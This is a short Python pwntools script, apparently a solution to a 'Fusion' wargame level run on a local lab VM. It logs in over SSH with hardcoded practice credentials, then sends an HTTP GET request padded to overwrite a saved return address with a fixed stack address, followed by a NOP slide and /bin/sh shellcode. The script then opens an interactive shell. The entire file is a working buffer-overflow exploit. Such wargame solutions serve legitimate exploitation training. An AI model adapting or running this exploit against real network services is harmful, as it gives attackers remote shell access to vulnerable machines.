from pwn import *

s = ssh(host='127.0.0.1', port=2222, user='fusion', password='godmode')
p = s.remote('localhost', 20000)

# address where shellcode is saved
target = p32(0xbffff8f8 + 157)

# shellcode for /bin/sh
nopslide = b'\x90' * 20
shellcode = nopslide + asm(shellcraft.sh())

start = b"GET /"
# padding to overwrite return pointer
padding = b"A" * 127 + b"A" * 12
end = b" HTTP/1.1"

# use shellcode after HTTP/1.1
payload = start + padding + target + end + shellcode

print(p.recvline().decode())

p.sendline(payload)
p.interactive()